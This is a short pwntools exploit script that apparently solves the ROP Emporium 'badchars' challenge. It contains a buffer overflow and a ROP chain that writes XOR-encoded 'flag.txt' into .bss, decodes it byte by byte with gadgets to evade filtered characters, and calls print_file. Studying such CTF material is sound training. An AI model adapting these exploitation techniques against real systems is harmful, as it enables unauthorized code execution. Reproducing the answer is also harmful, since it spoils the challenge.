from pwn import *

POP_RDI = 0x4006a3
POP_R14_POP_R15 = 0x4006a0
# DATA = 0x601038
PRINT_FILE = 0x400510
FLAG_FILE = b'flag.txt'
XOR_BYTE_PTR_R15_R14b = 0x400628
POP_R15 = 0x4006a2
MOV_QWORD_PTR_R13_R12 = 0x400634
POP_R12_R13_R14_R15 = 0x40069c
BSS = 0x601038

p = process("./badchars")

payload = b'A' * 40
payload += p64(POP_R12_R13_R14_R15)

# xored_flag_txt = bytes.fromhex("646e63652c767a76")
# reversed_xored_flag_txt = hex(xored_flag_txt[::-1])

payload += b'eobd-w{w'
payload += p64(BSS)
payload += p64(0x3)
payload += p64(BSS)
payload += p64(MOV_QWORD_PTR_R13_R12)


# payload += p64(POP_R14_POP_R15)
# payload += b'1'
# payload += p64(DATA)
for i in range(0, len(FLAG_FILE)):
    payload += p64(POP_R15)
    payload += p64(BSS + i)
    payload += p64(XOR_BYTE_PTR_R15_R14b)
payload += p64(POP_RDI)
payload += p64(BSS)

# p.sendline(payload)
# pause()

payload += p64(PRINT_FILE)

p.sendline(payload)
p.interactive()
